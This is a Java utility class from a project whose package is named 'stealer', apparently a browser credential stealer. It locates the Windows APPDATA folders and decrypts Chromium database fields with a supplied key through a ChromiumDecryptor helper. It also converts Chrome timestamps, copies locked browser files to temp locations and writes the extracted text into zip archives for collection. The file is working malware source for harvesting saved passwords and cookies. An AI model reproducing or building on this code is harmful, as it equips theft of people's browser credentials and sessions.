package com.github.shurpe.stealer.utils;

import com.github.shurpe.stealer.utils.browser.ChromiumDecryptor;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.time.Instant;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class Utils {

	public static final String APPDATA = System.getenv("APPDATA");
	public static final String LOCAL_APPDATA = System.getenv("LOCALAPPDATA");

	public static String formatDate(long t) {
		return Instant.ofEpochMilli(-11641732431255L + TimeUnit.MICROSECONDS.toMillis(t)).toString();
	}

	public static String getDate(ResultSet rs, String label) throws SQLException {
		return formatDate(rs.getLong(label));
	}

	public static String getEncrypted(ResultSet rs, String label, byte[] key) throws SQLException {
		return ChromiumDecryptor.decrypt(rs.getBytes(label), key);
	}

	public static File copyToTemp(File file) throws IOException {
		final Path temp = Files.createTempFile(UUID.randomUUID().toString(), "");

		return Files.copy(file.toPath(), temp, StandardCopyOption.REPLACE_EXISTING).toFile();
	}

	public static void writeZip(String text, String name, ZipOutputStream zip) {
		try {
			zip.putNextEntry(new ZipEntry(name));
			zip.write(text.getBytes(StandardCharsets.UTF_8));
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				zip.closeEntry();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static String randomString(Random rng, String characters, int length) {
		char[] text = new char[length];

		for (int i = 0; i < length; i++) {
			text[i] = characters.charAt(rng.nextInt(characters.length()));
		}

		return new String(text);
	}

	public static String randomNumericString(Random rng, int length) {
		return randomString(rng, "0123456789", length);
	}
}